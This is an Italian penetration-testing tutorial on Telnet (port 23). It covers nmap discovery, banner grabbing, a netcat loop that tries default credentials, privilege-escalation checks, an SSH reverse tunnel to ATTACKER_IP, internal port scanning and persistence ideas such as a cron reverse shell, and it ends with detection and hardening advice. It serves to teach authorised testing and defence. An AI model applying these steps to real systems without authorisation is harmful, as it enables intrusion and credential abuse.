---
title: 'Telnet Porta 23: Exploitation, Credential Abuse e Pivoting'
slug: telnet
description: |
  Scopri come sfruttare Telnet sulla porta 23 durante un pentest: enumerazione, banner grabbing, credenziali, privilege escalation, pivoting e lateral movement.
image: /telnet.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - telnet
  - port 23
  - Credential Abuse
  - Pivoting
---

# Telnet Exploitation: Credential Abuse, Pivoting e Lateral Movement su Porta 23

Telnet trasmette l'intera sessione — credenziali comprese — in chiaro su TCP/23. Non è una backdoor: è un canale senza cifratura né integrity checking, e questo lo rende un punto debole reale ogni volta che qualcuno può osservare quel traffico o ne riusa le credenziali altrove. Questa guida segue l'intera catena operativa su un target Telnet: discovery → fingerprint → enumerazione → autenticazione → post-auth → privilege escalation → pivoting → lateral movement.

## Cos'è Telnet e Perché TCP/23 è Rischiosa

Telnet è un protocollo di accesso remoto testuale, precedente a SSH, che non cifra né autentica il canale: username, password e ogni comando digitato viaggiano in chiaro. Il rischio concreto non è "chiunque in rete legge tutto automaticamente" — serve comunque essere in una posizione che intercetta quel traffico (stesso link fisico, porta mirror, MITM autorizzato) — ma quando quella condizione si verifica, non c'è alcuna protezione del canale a fermarti. A questo si somma il problema più comune nella pratica: credenziali default o riusate che rendono l'autenticazione stessa il punto debole, senza bisogno di sniffing.

## Fase 1 — Discovery

```bash
nmap -p 23 --open -sV -oA telnet_standard 10.10.10.0/24
```

Telnet usa normalmente TCP/23, ma in ambienti reali (soprattutto appliance/embedded) capita di trovarlo su porte alternative — non sono "le porte Telnet", sono scelte di configurazione del vendor:

```bash
nmap -p 23,2323,8023,2000-2010 --open -sV -oA telnet_nonstd 10.10.10.0/24
```

Su un target già identificato, un full-port scan evita di perdere servizi su porte non standard:

```bash
nmap -p- --min-rate 1000 -T4 -oA full_tcp 10.10.10.100
```

## Fase 2 — Fingerprinting e Banner Grabbing

Il banner iniziale è spesso la fonte di informazione più densa: versione software, vendor, a volte il tipo di dispositivo.

```bash
telnet 10.10.10.100 23
```

Cosa cercare nell'output e cosa significa:

* **Nome prodotto/vendor nel banner** (es. "Cisco IOS", "BusyBox") → indica se è un Linux server, un router/switch, o un dispositivo embedded — cambia completamente i passi successivi.
* **Versione software** → punto di partenza per cercare CVE note, se applicabile.
* **Richiesta immediata di login** vs **menu di configurazione** → distingue un host generico da un'appliance con interfaccia dedicata.

Script NSE mirati, non l'intero set `telnet-*` applicato alla cieca:

```bash
nmap -p 23 --script telnet-encryption,telnet-ntlm-info -sV 10.10.10.100
```

`telnet-encryption` verifica se il server supporta l'opzione di cifratura Telnet (raro, ma da controllare prima di assumere che sia sempre in chiaro); `telnet-ntlm-info` è utile sui pochi servizi Telnet Windows-based che espongono info di dominio nel banner NTLM.

### Telnet vs SSH

| Telnet                                                   | SSH                                         |
| -------------------------------------------------------- | ------------------------------------------- |
| Traffico in chiaro                                       | Traffico cifrato                            |
| TCP/23 tipico                                            | TCP/22 tipico                               |
| Nessuna cifratura né integrity checking del canale       | Cifratura e verifica di integrità integrate |
| Protocollo legacy, ancora presente su appliance/embedded | Standard moderno per accesso remoto         |

## Fase 3 — Credential Abuse

### Default Credentials per Vendor

Telnet resta rilevante soprattutto su router, switch, firewall gestibili, sistemi embedded e IoT/OT legacy — spesso con credenziali di default mai cambiate. Prima di qualsiasi spraying automatizzato, identifica il vendor dal banner (Fase 2) e cerca la wordlist di credenziali default specifica per quel dispositivo, invece di usare una lista generica.

### Test delle Credenziali

Il flusso di login su Telnet non è identico tra tutte le implementazioni (alcune chiedono solo la password, altre hanno prompt custom), quindi un ciclo bash con `echo -e` è un esempio illustrativo, non un metodo affidabile su ogni target:

```bash
for cred in "admin:admin" "cisco:cisco" "root:default"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo -e "$user\n$pass" | timeout 3 nc -nv 10.10.10.100 23 2>&1 | grep -v "Connection refused" && echo "Potential hit: $cred"
done
```

Per un test più affidabile su un flusso di autenticazione reale, uno strumento con modulo Telnet dedicato (es. Hydra) gestisce meglio prompt e retry rispetto a uno script fatto in casa.

## Fase 4 — Accesso Post-Auth

### Linux Server

```bash
id
sudo -l 2>/dev/null
uname -a
ip a || ifconfig
ss -antp || netstat -antp
```

### Network Appliance / Dispositivo Embedded

Qui il post-auth cambia natura: spesso non c'è una shell Unix ma un menu di configurazione proprietario. In questi casi l'obiettivo tipico non è privilege escalation locale ma:

* lettura della configurazione corrente (spesso contiene altre credenziali in chiaro, community SNMP, chiavi PSK);
* verifica delle interfacce/subnet raggiungibili da quel dispositivo, utile per la fase di pivoting successiva;
* eventuale export/backup della config per analisi offline.

## Fase 5 — Privilege Escalation

Se l'accesso è su un Linux server, l'enumerazione locale segue lo stesso schema di un qualunque foothold: cerca il vettore, non ripetere l'intera checklist qui.

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
crontab -l
```

Per l'enumerazione SUID/capabilities/cron completa vedi [SUID](https://hackita.it/articoli/suid/) e la [guida Linux Privesc](https://hackita.it/articoli/linux-privesc/); per verificare binari sfruttabili una volta trovato un vettore, [GTFOBins](https://hackita.it/articoli/gtfobins/) resta il riferimento più veloce.

## Fase 6 — Pivoting

La logica del pivot da un host Telnet compromesso segue una catena precisa:

```text
Host Telnet compromesso
     |
Interfacce di rete disponibili
     |
Tabella di routing
     |
Subnet non raggiungibili direttamente dal tuo attacker
     |
Servizi interni scopribili solo da questo host
     |
Lateral movement
```

```bash
ip route
```

Un tunnel SSH inverso è una tecnica di pivoting generica — non specifica di Telnet — utilizzabile una volta ottenuto accesso all'host, se è disponibile un client SSH in uscita:

```bash
ssh -R 2222:localhost:22 -N -f kali@ATTACKER_IP
```

```bash
ssh -p 2222 localhost
```

Per approfondire tecniche di pivoting oltre il singolo tunnel, vedi la [guida al pivoting](https://hackita.it/articoli/pivoting/) e, per il tunneling SSH in generale, l'articolo su [SSH](https://hackita.it/articoli/ssh/).

Dall'host compromesso, una scansione mirata sulla subnet interna aiuta a mappare servizi non visibili dall'esterno:

```bash
for i in {1..254}; do timeout 1 nc -zv 10.20.30.$i 445 2>&1 | grep succeeded; done
```

Per test di connettività più strutturati vedi la [guida Netcat](https://hackita.it/articoli/netcat/).

## Fase 7 — Lateral Movement

Il vettore più comune dopo Telnet non è tecnico ma di riuso: la stessa password trovata (default o craccata) spesso vale anche su altri servizi dello stesso ambiente.

```bash
ssh user@internal-ip
```

Se il target ha anche [SMB](https://hackita.it/articoli/smb/) esposto, vale la pena verificare lo stesso riuso lì prima di assumere che l'accesso Telnet sia un vicolo cieco isolato.

## Persistence Dopo il Compromesso Telnet

Solo se previsto dallo scope dell'engagement. In sintesi, senza duplicare l'intera checklist:

* utente locale aggiuntivo con privilegi (`useradd` + `usermod -aG sudo`);
* chiave pubblica in `authorized_keys` per un accesso SSH persistente;
* cron job o entry di avvio (`rc.local`) per un reverse shell schedulato.

Per il dettaglio sulla sintassi cron vedi l'articolo su [crontab](https://hackita.it/articoli/crontab/). Ogni voce qui è un IoC facilmente rilevabile: da usare solo se l'engagement lo richiede esplicitamente.

## Troubleshooting: Telnet Aperto ma Non Riesco ad Autenticarmi

* **Connessione rifiutata subito dopo l'handshake** → un wrapper (tcpd/xinetd) potrebbe filtrare per IP sorgente.
* **Nessun banner mostrato** → alcune configurazioni lo disabilitano esplicitamente; non significa che il servizio non risponda.
* **Timeout durante il login** → verifica se il servizio applica rate limiting o blocco temporaneo dopo tentativi falliti.
* **Prompt "Username" ma password sempre rifiutata** → prova varianti del vendor (case sensitivity, spazi finali nel banner che confondono lo script).
* **Accesso consentito solo da IP specifici** → tipico su appliance con ACL di management; verifica da quale segmento stai testando.
* **Servizio dietro un proxy/wrapper** → alcuni Telnet "custom" richiedono una sequenza di byte iniziale non standard prima del prompt: una connessione manuale con `telnet` mostra subito la differenza rispetto a un client scriptato.

## Detection & Hardening

**IoC tipico** in `/var/log/auth.log`:

```
Jan 28 10:15:23 legacy-server telnetd[1234]: session opened for user admin from [10.20.30.40]
```

**Hardening:**

```bash
systemctl disable --now telnet.socket
apt remove telnetd -y
```

Se il servizio deve restare per compatibilità con un'appliance legacy, isolalo su una VLAN dedicata con accesso limitato alle sole postazioni di management.

## Playbook 80/20

| Fase                 | Obiettivo                                    | Comando/Approccio                               |
| -------------------- | -------------------------------------------- | ----------------------------------------------- |
| Discovery            | Trovare TCP/23 e porte alternative           | `nmap -p 23,2323,8023 --open -sV 10.10.10.0/24` |
| Fingerprinting       | Identificare vendor/versione dal banner      | `telnet target 23` + script NSE mirati          |
| Credential Abuse     | Testare default credentials del vendor       | Wordlist specifica per il dispositivo           |
| Post-Auth            | Enumerare sistema o configurazione appliance | `id; sudo -l; ip a` oppure lettura config       |
| Privilege Escalation | Trovare un vettore locale                    | `find / -perm -4000`, poi vedi SUID/GTFOBins    |
| Pivoting             | Mappare subnet raggiungibili dall'host       | `ip route` + scan interno mirato                |
| Lateral Movement     | Validare riuso delle credenziali             | Stessa password su SSH/SMB                      |
| Reporting            | Documentare rischio e remediation            | —                                               |

## Lab Pratico: LegacyCorp Breach

Percorso end-to-end su uno scenario realistico:

```text
TCP/23 esposto su server Ubuntu 16.04
     |
Credenziali default riutilizzate su questo host
     |
Enumerazione locale: cron job scrivibile trovato
     |
Privilege escalation a root via il cron misconfigured
     |
Chiave SSH trovata in un backup locale
     |
Pivot verso jump host interno con quella chiave
     |
Password reuse verificata anche su un account di dominio
     |
Lateral movement in Active Directory
```

Ogni passaggio della catena è lo stesso mostrato nelle fasi sopra: il valore dello scenario è vedere dove Telnet si inserisce (solo il primo anello), non trattarlo come se garantisse da solo l'intera compromissione.

## FAQ

**Telnet trasmette le credenziali in chiaro?**
Sì, l'intera sessione (login incluso) viaggia senza cifratura. Il rischio pratico dipende comunque da chi può osservare quel traffico.

**Telnet è più sicuro di SSH?**
No: SSH cifra il canale e verifica l'integrità dei dati, Telnet non fa nessuna delle due cose. Telnet resta in uso quasi solo per compatibilità con hardware legacy.

**Come verifico se Telnet è ancora necessario in un ambiente?**
Controlla se il servizio è usato solo per management di appliance che non supportano SSH; se esiste un'alternativa cifrata (anche via VPN sull'interfaccia di management), Telnet può essere disabilitato senza perdita di funzionalità.

**Cosa fare dopo aver ottenuto accesso via Telnet?**
Dipende dal tipo di host: su un Linux server, enumerazione locale per privilege escalation; su un'appliance, lettura della configurazione per credenziali riusabili altrove e mappatura delle subnet raggiungibili.

***

Le tecniche descritte sono valide esclusivamente in laboratorio o in engagement autorizzati per iscritto. Per la classificazione delle tecniche di movimento laterale in questo contesto, la tattica di riferimento MITRE ATT\&CK è [Lateral Movement (TA0008)](https://attack.mitre.org/tactics/TA0008/).
